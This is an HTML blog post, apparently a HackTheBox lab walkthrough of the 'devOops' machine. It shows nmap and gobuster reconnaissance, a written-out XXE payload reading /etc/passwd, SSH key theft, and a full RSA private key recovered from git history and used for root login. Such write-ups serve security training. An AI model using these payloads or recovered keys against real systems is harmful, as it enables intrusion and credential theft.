@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="Marco Meli">
+  <meta name="description" content="devOops | blah blah Recon m4rc0ff@SittingDucks:~$ nmap -sC -sV 10.10.10.91 Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-29 14:08 BST Nmap scan...">
+
+  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
+  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/font.css" type="text/css" media="all">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/style.css" type="text/css" media="all">
+
+  
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="https://sittingducks.io/theme/js/functions.min.js"></script>
+
+  <link href="https://sittingducks.io/theme/css/colorbox.css" rel="stylesheet">
+
+  <link href="https://fonts.googleapis.com/css?family=Squada+One|Source+Code+Pro|Merriweather:300|Abril+Fatface" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+  <script src="/theme/tipuesearch/tipuesearch_set.js"></script>
+  <script src="/tipuesearch_content.js"></script>
+  <link rel="stylesheet" href="/theme/tipuesearch/tipuesearch.css">
+  <script src="/theme/tipuesearch/tipuesearch.js"></script>
+ 
+
+
+<meta name="keywords" content="HackTheBox">
+
+
+  <title>devOops</title>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-156989597-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+</head>
+
+<body class="home blog">
+  <div>
+    <header class="site-header">
+      <nav class="navbar navbar-default" role="navigation"> 
+	  
+		<form id="searchform" action="/search" onsubmit="return (this.elements['q'].value.length > 0)">
+		<input id="searchbox" type="text" name="q" size="12" placeholder="Search">
+		</form>
+		
+        <div class="container">
+          <div class="row">
+            <div class="site-navigation-inner col-sm-12">
+              <div class="navbar-header">
+                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                  <span class="sr-only">Toggle navigation</span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                </button>
+              </div>
+              <div class="collapse navbar-collapse navbar-ex1-collapse">
+              <ul id="menu-all-pages" class="nav navbar-nav">
+                <li class="menu-item"><a href="htts://sittingducks.io" >home
+<i class="fa  fa-lg"></i></a></li>
+              </ul>
+              </div>
+              <div class="social">   
+                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
+<i class="fa fa-linkedin fa-lg"></i></a>
+                <a href="https://twitter.com/M4rC0ff" title="Twitter" >
+<i class="fa fa-twitter fa-lg"></i></a>
+                <a href="https://github.com/M4rc0ff" title="github" >
+<i class="fa fa-github fa-lg"></i></a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav><!-- .site-navigation -->
+
+      <div class="container">
+      <div id="logo">
+        <span class="site-name"><a class="navbar-brand" href="https://sittingducks.io"><img width="310" src="../images/logo.png" class="attachment-full size-full" alt="logo">          </a>
+        </span><!-- end of .site-name -->
+      </div><!-- end of #logo -->
+        <div class="tagline">
+                <a href="https://sittingducks.io/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
+                <a href="https://sittingducks.io/tag/hackthebox.html" >HackTheBox (32)</a> &#124; 
+                <a href="https://sittingducks.io/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
+                <a href="https://sittingducks.io/archives.html" >Archives (34)</a>
+        </div>
+    </div>
+
+  </header><!-- #masthead -->
+  </div>
+    <div id="content" class="site-content">
+      <div class="container main-content-area">
+        <div class="row">
+          <div class="main-content-inner col-sm-12 col-md-12">
+            <div id="primary" class="content-area">
+              <div id="main" class="site-main" role="main">
+                <div class="article-container">
+<article>
+  <div class="blog-item-wrap">
+    <div class="post-inner-content">
+      <header class="entry-header page-header">
+        <span class="cat-item"><time datetime="2020-05-29 15:27:00+01:00">Fri 29 May 2020</time></span>
+        <h1 class="entry-title"><a href="https://sittingducks.io/devOops.html">devOops</a></h1>
+      </header><!-- .entry-header -->
+      <div class="fb-like" data-href="https://sittingducks.io/devOops.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
+      <div class="entry-content">
+        <p>blah blah </p>
+<h1 id="recon">Recon</h1>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> nmap -sC -sV <span class="m">10</span>.10.10.91
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-29 14:08 BST</span>
+<span class="go">Nmap scan report for 10.10.10.91                                                                        </span>
+<span class="go">Host is up (0.086s latency).                                                                            </span>
+<span class="go">Not shown: 998 closed ports                                                                             </span>
+<span class="go">PORT     STATE SERVICE VERSION                                                                          </span>
+<span class="go">22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)</span>
+<span class="go">| ssh-hostkey:                                                                                          </span>
+<span class="go">|   2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 (RSA)        </span>
+<span class="go">|   256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 (ECDSA)            </span>
+<span class="go">|_  256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 (ED25519)     </span>
+<span class="go">5000/tcp open  http    Gunicorn 19.7.1                                                                  </span>
+<span class="go">|_http-server-header: gunicorn/19.7.1                                                                   </span>
+<span class="go">|_http-title: Site doesn&#39;t have a title (text/html; charset=utf-8).        </span>
+<span class="go">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel               </span>
+
+<span class="go">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="go">Nmap done: 1 IP address (1 host up) scanned in 17.39 seconds    </span>
+</pre></div>
+
+
+<p>The Home page of the website is shown below. It does not show very interesting information, just the text on the top which can be useful later on. The rest is just an image. The html source does not show anything useful either:</p>
+<p><img alt="" src="../images/devOops-home.png"></p>
+<p>Let's scan directories with <code>gobuster</code>:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> gobuster dir -u http://10.10.10.91:5000 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html                                  
+<span class="go">===============================================================                                                                                                                                                  </span>
+<span class="go">Gobuster v3.0.1                                                                                                                                                                                                  </span>
+<span class="go">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)                                                                                                                                                  </span>
+<span class="go">===============================================================                                                                                                                                                  </span>
+<span class="go">[+] Url:            http://10.10.10.91:5000                                                                                                                                                                      </span>
+<span class="go">[+] Threads:        10                                                                                                                                                                                           </span>
+<span class="go">[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt                                                                                                                                 </span>
+<span class="go">[+] Status codes:   200,204,301,302,307,401,403                                                                                                                                                                  </span>
+<span class="go">[+] User Agent:     gobuster/3.0.1                                                                                                                                                                               </span>
+<span class="go">[+] Extensions:     php,html                                                                                                                                                                                     </span>
+<span class="go">[+] Timeout:        10s                                                                                                                                                                                          </span>
+<span class="go">===============================================================                                                                                                                                                  </span>
+<span class="go">2020/05/29 14:28:40 Starting gobuster                                                                                                                                                                            </span>
+<span class="go">===============================================================                                                                                                                                                  </span>
+<span class="go">/feed (Status: 200)                                                                                                                                                                                              </span>
+<span class="go">/upload (Status: 200)         </span>
+</pre></div>
+
+
+<p>the page <code>/feed</code> shows only the same image that we saw in the Home page.</p>
+<p><code>/upload</code> shows the following:</p>
+<p><img alt="" src="../images/devOops-upload.png"></p>
+<p>The upload page seems to indicate that it take XML elements. As a test I created an xml file as follwow:</p>
+<div class="highlight"><pre><span></span>m4rc0ff@SittingDucks:~/Documents/htbBoxes/devOops$ cat SittingDucks.xml 
+<span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+    <span class="nt">&lt;body&gt;</span>
+        <span class="nt">&lt;Author&gt;</span>M4rc0ff<span class="nt">&lt;/Author&gt;</span>
+        <span class="nt">&lt;Subject&gt;</span>SittingDucks.io<span class="nt">&lt;/Subject&gt;</span>
+        <span class="nt">&lt;Content&gt;</span>devOops<span class="nt">&lt;/Content&gt;</span>
+    <span class="nt">&lt;/body&gt;</span> 
+</pre></div>
+
+
+<p>When I try to upload the file I get this:</p>
+<p><img alt="" src="../images/devOops-uploaded.png"></p>
+<p>this proves that we can upload XML files. It also discloses information about a path, <code>/home/roosa/deploy/src</code> which could be where the uploaded files end, and that <code>roosa</code> is a potentially valid user of the box.</p>
+<p>To prove that <code>roosa</code> is a valid user we can try an <a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing">XML External Entity attack (XEE)</a>. This kind of attack is performed against applications that parse XML documents and the XML input contains a reference to an <a href="https://www.w3.org/TR/REC-xml/#sec-external-ent">External Entity</a> such as <code>SYSTEM</code>.</p>
+<p>As an example if we want to use this attack to confirm the user <code>roosa</code> exists in the box we can try to read the content of the <code>/etc/passwd</code> file modifying the XML we used before as follow:</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+<span class="cp">&lt;!DOCTYPE foo [</span>
+<span class="cp">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;</span>
+]&gt;
+<span class="nt">&lt;body&gt;</span>
+       <span class="nt">&lt;Author&gt;</span>M4rc0ff<span class="nt">&lt;/Author&gt;</span>
+       <span class="nt">&lt;Subject&gt;</span>SittingDucks.io<span class="nt">&lt;/Subject&gt;</span>
+       <span class="nt">&lt;Content&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/Content&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+</pre></div>
+
+
+<p>As shown above we have defined the <code>xxe</code> parameter entity in our DOCTYPE <code>foo</code>. Once we upload this file to the webserver the XML parser will call the <code>SYSTEM</code> external entity and execute  <code>file:///etc/passwd</code>. Once parser, the <code>&lt;Content&gt;</code> tag would contain the content of the <code>/etc/passwd</code> file. To try this out I captured a request with burp and passed it to the repeater, then I send the request and obain this:</p>
+<p><img alt="" src="../images/devOops-passwd.png"></p>
+<p>The above demonstrates that the application is vulnerable to XEE vulnerabilities and we are able to confirm that the user <code>roosa</code> exists and has a valid shell. </p>
+<p>With this information we can assume that the user <code>roosa</code> is alloewed to login through SSH and that he/she has an SSH private key stored under the default location (<code>/home/roosa/.ssh/id_rsa</code>). So we can craft another XEE payload to retrieve the SSH key:</p>
+<p><img alt="" src="../images/dev0ops-sshKey.png"></p>
+<p>It worked, so we can copy the key into a file and use it to login to the box:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/devOops$</span> chmod <span class="m">600</span> ssh.key                                                                                                                                             
+<span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/devOops$</span> ssh -i ssh.key roosa@10.10.10.91
+<span class="go">The authenticity of host &#39;10.10.10.91 (10.10.10.91)&#39; can&#39;t be established.</span>
+<span class="go">ECDSA key fingerprint is SHA256:hbD2D4PdnIVpAFHV8sSAbtM0IlTAIpYZ/nwspIdp4Vg.</span>
+<span class="go">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span>
+<span class="go">Warning: Permanently added &#39;10.10.10.91&#39; (ECDSA) to the list of known hosts.</span>
+<span class="go">Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)</span>
+
+<span class="go"> * Documentation:  https://help.ubuntu.com</span>
+<span class="go"> * Management:     https://landscape.canonical.com</span>
+<span class="go"> * Support:        https://ubuntu.com/advantage</span>
+
+<span class="go">135 packages can be updated.</span>
+<span class="go">60 updates are security updates.</span>
+
+
+<span class="go">The programs included with the Ubuntu system are free software;</span>
+<span class="go">the exact distribution terms for each program are described in the</span>
+<span class="go">individual files in /usr/share/doc/*/copyright.</span>
+
+<span class="go">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span>
+<span class="go">applicable law.</span>
+
+<span class="gp">roosa@gitter:~$</span> cat user.txt 
+<span class="go">c5****************************7b</span>
+</pre></div>
+
+
+<p>and indeed I was able to login with that key and get the <code>usert.txt</code> flag. </p>
+<div class="highlight"><pre><span></span><span class="gp">roosa@gitter:~$</span> ll
+<span class="go">total 168</span>
+<span class="go">drwxr-xr-x 22 roosa roosa 4096 May 30 00:10 ./</span>
+<span class="go">drwxr-xr-x  7 root  root  4096 Mar 19  2018 ../</span>
+<span class="go">-r--------  1 roosa roosa 5704 Mar 21  2018 .bash_history</span>
+<span class="go">-rw-r--r--  1 roosa roosa  220 Mar 19  2018 .bash_logout</span>
+<span class="go">-rw-r--r--  1 roosa roosa 3771 Mar 19  2018 .bashrc</span>
+<span class="go">drwx------ 12 roosa roosa 4096 May 29 12:43 .cache/</span>
+<span class="go">drwx------  3 roosa roosa 4096 Mar 21  2018 .compiz/</span>
+<span class="go">drwx------ 14 roosa roosa 4096 Mar 21  2018 .config/</span>
+<span class="go">drwx------  3 root  root  4096 Mar 21  2018 .dbus/</span>
+<span class="go">drwxrwxr-x  4 roosa roosa 4096 Mar 26  2018 deploy/</span>
+<span class="go">drwxr-xr-x  2 roosa roosa 4096 May 29  2018 Desktop/</span>
+<span class="go">-rw-r--r--  1 roosa roosa   25 Mar 21  2018 .dmrc</span>
+<span class="go">drwxr-xr-x  2 roosa roosa 4096 Mar 21  2018 Documents/</span>
+<span class="go">drwxr-xr-x  2 roosa roosa 4096 Mar 21  2018 Downloads/</span>
+<span class="go">drwx------  3 roosa roosa 4096 Mar 20  2018 .emacs.d/</span>
+<span class="go">-rw-r--r--  1 roosa roosa 8980 Mar 19  2018 examples.desktop</span>
+<span class="go">drwx------  2 roosa roosa 4096 Mar 26  2018 .gconf/</span>
+<span class="go">-rw-rw-r--  1 roosa roosa   56 Mar 19  2018 .gitconfig</span>
+<span class="go">drwx------  3 roosa roosa 4096 May 31  2018 .gnupg/</span>
+<span class="go">-rw-------  1 roosa roosa 5100 May 29  2018 .ICEauthority</span>
+<span class="go">drwx------  3 roosa roosa 4096 Mar 21  2018 .local/</span>
+<span class="go">drwxr-xr-x  2 roosa roosa 4096 Mar 21  2018 Music/</span>
+<span class="go">drwxrwxr-x  2 roosa roosa 4096 Mar 19  2018 .nano/</span>
+<span class="go">drwxr-xr-x  2 roosa roosa 4096 Mar 21  2018 Pictures/</span>
+<span class="go">-rw-r--r--  1 roosa roosa  655 Mar 19  2018 .profile</span>
+<span class="go">drwxr-xr-x  2 roosa roosa 4096 Mar 21  2018 Public/</span>
+<span class="go">-rwxrw-r--  1 roosa roosa  147 Mar 26  2018 run-blogfeed.sh*</span>
+<span class="go">-rw-rw-r--  1 roosa roosa 1839 Mar 26  2018 service.sh</span>
+<span class="go">-rw-rw-r--  1 roosa roosa 2206 Mar 26  2018 service.sh~</span>
+<span class="go">drwx------  2 roosa roosa 4096 Mar 26  2018 .ssh/</span>
+<span class="go">-rw-r--r--  1 roosa roosa    0 Mar 21  2018 .sudo_as_admin_successful</span>
+<span class="go">drwxr-xr-x  2 roosa roosa 4096 Mar 21  2018 Templates/</span>
+<span class="go">-r--------  1 roosa roosa   33 Mar 26  2018 user.txt</span>
+<span class="go">drwxr-xr-x  2 roosa roosa 4096 Mar 21  2018 Videos/</span>
+<span class="go">-rw-rw-r--  1 roosa roosa  182 Mar 26  2018 .wget-hsts</span>
+<span class="go">drwxrwxr-x  3 roosa roosa 4096 Mar 21  2018 work/</span>
+<span class="go">-rw-------  1 roosa roosa  205 May 29  2018 .Xauthority</span>
+<span class="go">-rw-------  1 roosa roosa 1389 May 31  2018 .xsession-errors</span>
+<span class="go">-rw-------  1 roosa roosa   82 May 24  2018 .xsession-errors.old</span>
+</pre></div>
+
+
+<p>The <code>ll</code> command above shows there is a <code>bash_history</code> file and I start having a look:</p>
+<div class="highlight"><pre><span></span><span class="go">&lt;SNIP&gt;</span>
+<span class="go">ls -altr resources/integration/</span>
+<span class="go">rm -Rf resources/integration/auth_credentials.key</span>
+<span class="go">mv resources/authcredentials.key resources/integration/</span>
+<span class="go">git add resources/integration/authcredentials.key </span>
+<span class="go">git commit -m &#39;add key for feed integration from tnerprise backend&#39;</span>
+<span class="go">ls -altr resources/integration/</span>
+<span class="go">git push</span>
+<span class="go">ssh-keygen</span>
+<span class="go">ös -altr</span>
+<span class="go">ls .altr</span>
+<span class="go">ls -altr</span>
+<span class="go">cat kak</span>
+<span class="go">cp kak resources/integration/authcredentials.key </span>
+<span class="go">git add resources/integration/authcredentials.key </span>
+<span class="go">git commit -m &#39;reverted accidental commit with proper key&#39;</span>
+<span class="go">git push</span>
+<span class="go">&lt;SNIP&gt;</span>
+</pre></div>
+
+
+<p>The above snippet shows <code>git</code> has been used and some credentials have been reverted. Let's have a look for <code>git</code> repositories in the system:</p>
+<div class="highlight"><pre><span></span><span class="gp">roosa@gitter:~$</span> find / -type d -name <span class="s1">&#39;.git&#39;</span> <span class="m">2</span>&gt;/dev/null
+<span class="go">/home/roosa/work/blogfeed/.git</span>
+</pre></div>
+
+
+<p>Moving to that repo and running the below command I can see in more details what happened:</p>
+<div class="highlight"><pre><span></span><span class="gp">roosa@gitter:~/work/blogfeed$</span> git log --name-only --oneline
+<span class="go">7ff507d Use Base64 for pickle feed loading</span>
+<span class="go">src/feed.py</span>
+<span class="go">src/index.html</span>
+<span class="go">26ae6c8 Set PIN to make debugging faster as it will no longer change every time the application code is changed. Remember to remove before production use.</span>
+<span class="go">run-gunicorn.sh</span>
+<span class="go">src/feed.py</span>
+<span class="go">cec54d8 Debug support added to make development more agile.</span>
+<span class="go">run-gunicorn.sh</span>
+<span class="go">src/feed.py</span>
+<span class="go">ca3e768 Blogfeed app, initial version.</span>
+<span class="go">src/feed.py</span>
+<span class="go">src/index.html</span>
+<span class="go">src/upload.html</span>
+<span class="go">dfebfdf Gunicorn startup script</span>
+<span class="go">run-gunicorn.sh</span>
+<span class="go">33e87c3 reverted accidental commit with proper key</span>
+<span class="go">resources/integration/authcredentials.key</span>
+<span class="go">d387abf add key for feed integration from tnerprise backend</span>
+<span class="go">resources/integration/authcredentials.key</span>
+<span class="go">1422e5a Initial commit</span>
+<span class="go">README.md</span>
+</pre></div>
+
+
+<p>So after the initial commit (1422e5a), a key was added (commit d387abf) and straight after in another commit (33e87c3) the key was reverted because of a mistake. To read the reverted key we can run the following command:</p>
+<div class="highlight"><pre><span></span><span class="gp">roosa@gitter:~/work/blogfeed$</span> git diff 1422e5a d387abf
+<span class="go">diff --git a/resources/integration/authcredentials.key b/resources/integration/authcredentials.key</span>
+<span class="go">new file mode 100644</span>
+<span class="go">index 0000000..44c981f</span>
+<span class="go">--- /dev/null</span>
+<span class="go">+++ b/resources/integration/authcredentials.key</span>
+<span class="go">@@ -0,0 +1,28 @@</span>
+<span class="go">+-----BEGIN RSA PRIVATE KEY-----</span>
+<span class="go">+MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde</span>
+<span class="go">+8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i</span>
+<span class="go">+vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK</span>
+<span class="go">+nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt/rEgIVmrb+</span>
+<span class="go">+CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc/SHSE0c</span>
+<span class="go">+F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH</span>
+<span class="go">+uzjPbIdyEkDc3PAYP+E/jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL</span>
+<span class="go">+gCfN5I+xZGH19V4HPMCrK6PzskYII3/i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD</span>
+<span class="go">+k2X0256DbRv/ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy</span>
+<span class="go">+NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM</span>
+<span class="go">+HSRik2J/7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa</span>
+<span class="go">+2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK/oLc0RB</span>
+<span class="go">+GLEKU6HtUuKFvlXdJ22S4/rQb0RiDcU/wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG</span>
+<span class="go">+jwrjv/loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41</span>
+<span class="go">+IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw</span>
+<span class="go">++XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp/QYtjn/ltojR16JNTKqiW</span>
+<span class="go">+7vSqlsZnT9jR2syvuhhVz4Ei9yA/VYZG2uiCpK0CgYA/UOhz+LYu/MsGoh0+yNXj</span>
+<span class="go">+Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS</span>
+<span class="go">+iD6fE+5/i/rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo/PcFlfXQhrERxRXJQKPHdJP7</span>
+<span class="go">+VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp/INRX</span>
+<span class="go">+S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6</span>
+<span class="go">+md/EqUtm84/VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie</span>
+<span class="go">+LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz</span>
+<span class="go">+oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw</span>
+<span class="go">+LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE=</span>
+<span class="go">+-----END RSA PRIVATE KEY-----</span>
+</pre></div>
+
+
+<p>If I tried to SSH as root with the above key it initially failed complaining about the key having an invalid format. </p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/dev0ops$</span> ssh -i auth.key root@10.10.10.91
+<span class="go">Load key &quot;auth.key&quot;: invalid format</span>
+<span class="go">root@10.10.10.91&#39;s password:</span>
+</pre></div>
+
+
+<p>Just needed to remove the <code>+</code> that prepend each line and then I was able to login and grab the root flag:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/dev0ops$</span> ssh -i auth.key root@10.10.10.91
+<span class="go">Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)</span>
+
+<span class="go"> * Documentation:  https://help.ubuntu.com</span>
+<span class="go"> * Management:     https://landscape.canonical.com</span>
+<span class="go"> * Support:        https://ubuntu.com/advantage</span>
+
+<span class="go">135 packages can be updated.</span>
+<span class="go">60 updates are security updates.</span>
+
+<span class="go">Last login: Sat May 30 01:32:23 2020 from 10.10.14.15</span>
+<span class="gp">root@gitter:~#</span> cat root.txt 
+<span class="go">d4****************************b3</span>
+</pre></div>
+			<style>
+#pcs-comment-form input,
+#pcs-comment-form textarea {
+	width: 100%;
+}
+#pcs-comment-form-display-replyto {
+	border: solid 1px black;
+	padding: 2px;
+}
+#pcs-comment-form-display-replyto p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+#pcs-comments ul {
+	list-style: none;
+}
+#pcs-comments .comment-left {
+	display: table-cell;
+	padding-right: 10px;
+}
+#pcs-comments .comment-body {
+	display: table-cell;
+	vertical-align: top;
+	width: 100%;
+}
+</style>
+
+	<section id="pcs-comments">
+	<header>
+		<h2>Comments</h2>
+		<hr/>
+	</header>
+		<p>There are no comments yet.</p>
+	<section>
+	<form id="pcs-comment-form" action="#">
+		<legend>Add a Comment</legend>
+		<input type="hidden" id="pcs-comment-form-input-replyto">
+		<fieldset>
+			<label for="pcs-comment-form-input-name">Name</label>
+			<input  id="pcs-comment-form-input-name" type="text" placeholder="Enter your name or nickname" />
+		</fieldset>
+		<fieldset>
+			<label for="pcs-comment-form-input-website">Website</label>
+			<input  id="pcs-comment-form-input-website" type="text" placeholder="Enter your website (optional)" />
+		</fieldset>
+		<fieldset>
+			<label   for="pcs-comment-form-input-textarea">Your Comment</label>
+			<textarea id="pcs-comment-form-input-textarea" rows="5" style="resize:vertical;" placeholder="Your comment"></textarea>
+			<p>You can use the <a href="https://en.wikipedia.org/wiki/Markdown">Markdown</a> syntax to format your comment.</p>
+			<div style="display: none; " id="pcs-comment-form-display-replyto"></div>
+		</fieldset>
+
+		<button type="submit"
+				id="pcs-comment-form-button-submit"
+				>Post via email</button>
+
+			<a href="https://sittingducks.io/feeds/comment.devOops.atom.xml">
+				Comment Atom Feed
+			</a>
+	</form>
+</section>
+
+</section>
+
+			<script type="text/javascript" src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+	<script type="text/javascript" src="https://sittingducks.io/theme/js/comments.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			CommentSystem.email_user   = "sittingducks.io";
+			CommentSystem.email_domain = "protonmail.com";
+			CommentSystem.display_replyto_html = function(comment_content, article_slug, author) { 
+				return ''
+					+ '<button style="float:right;" onclick="CommentSystem.cancelReply(); return false;" title="Cancel the reply">'
+					+ 	'×'
+					+ '</button>'
+					+ '<p>This comment will be posted as a reply to \'<a title="'+comment_content+'" href="#comment-'+article_slug+'">'+author+'</a>\'</p>';
+			};
+
+			$('#pcs-comment-form').on("submit",
+				function( event )
+				{
+					event.preventDefault();
+					$(location).attr('href', CommentSystem.getMailtoLink("devOops"));
+				}
+			);
+		});
+	</script>
+
+
+      </div><!-- .entry-content -->
+      <br /><br />
+      <div class="article_meta">
+        Tags:
+          <a href="https://sittingducks.io/tag/hackthebox.html">HackTheBox</a>      </div>
+    </div>
+  </div>
+</article><!-- #post-## -->
+                </div>
+              </div><!-- #main -->
+          </div><!-- #primary -->
+        </div>
+      </div><!-- close .row -->
+    </div><!-- close .container -->
+  </div><!-- close .site-content -->
+
+
+
+
+  <div id="footer-area">
+    <footer id="colophon" class="site-footer" role="contentinfo">
+      <div class="site-info container">
+        <div class="row">
+                    <div class="copyright col-md-12">
+                    <a href="https://sittingducks.io/pages/privacy-policy">Privacy Policy</a> | 
+                    <a href="https://sittingducks.io/feeds/all.atom.xml">Atom Feed</a> | 
+                    <a href="https://sittingducks.io/sitemap.xml">Sitemap</a><br />
+                    &copy; 2019 <a href="https://sittingducks.io">Marco Meli</a> </div>
+        </div>
+      </div><!-- .site-info -->
+      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
+    </footer><!-- #colophon -->
+  </div>
+
+  <script type="text/javascript">
+    window.addEventListener('load', function(){
+    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
+      window.scroll(0, document.getElementById('main').offsetTop);
+    }})
+  </script>
+
+  
+ <!-- <script src="https://sittingducks.io/theme/js/jquery.min.js"></script> -->
+	<!-- Make sure jquery is loaded first, then load colorbox -->
+  <script src="https://sittingducks.io/theme/js/jquery.colorbox-min.js"></script>
+  <script src="https://sittingducks.io/theme/js/load-colorbox.js"></script>
+
+
+  
+  
+</body>
+</html>
